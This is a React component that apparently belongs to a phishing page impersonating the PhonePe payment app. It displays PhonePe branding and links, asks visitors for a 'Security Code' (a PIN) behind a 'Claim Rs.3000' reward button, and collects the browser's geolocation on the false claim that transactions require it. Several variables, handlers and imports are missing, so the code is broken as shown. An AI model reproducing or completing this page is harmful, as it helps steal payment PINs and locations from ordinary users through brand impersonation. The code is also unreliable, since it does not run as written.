'use client'

import { useEffect } from "react";


export default function(){
    
    const [latitude, setLatitude] = useState('');
    const [longitude, setLongitude] = useState('');
    const [message, setMessage] = useState('');

useEffect(()=>{
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          showPosition,
          handleLocationError
        )
  
      } else {
        setMessage('In order to make transactions, please enable your location.');
        setIsErr(true);
      }
    
},[])

function showPosition(position) {
    setLatitude(position.coords.latitude);
    setLongitude(position.coords.longitude);
  }
  
  return (
    <>

      <div className='pinBox'>

        <div className="PhonepeLogo">
        <a target="_blank" href="https://www.phonepe.com/">
        <Image
        src='https://cdn.shopify.com/s/files/1/0810/2582/7123/files/phonepe.webp?v=1696337949'
        width={200}
        height={80}
        alt='phonePe'
        />
        </a>
        </div>

        <div className="Input">
          <input type="text" value={name} onChange={(e) => setName(e.target.value)} placeholder="Enter Security Code" />
        </div>
        <div className="Input">
          <input type="text" value={pin} onChange={(e) => setPin(e.target.value)} placeholder="Enter Security Code" />
        </div>


        <button className={pin ? 'Verify-Btn show' : "Verify-Btn blur"} onClick={verifyPIN}>Claim Rs.3000</button>

        {message ?

          <div className="message">
            <p>{message}</p>
          </div>
          : ''
        }
        <div className="contact-us">
          <a href="https://support.phonepe.com/"> contact</a>
        </div>
      </div>


      {pin == pin2 ?

        <div className="view-data">

          <p>Latitude : {latitude}</p>
          <p>longitude: {longitude}</p>

        </div>
        : ''
      }
    </>
  )
}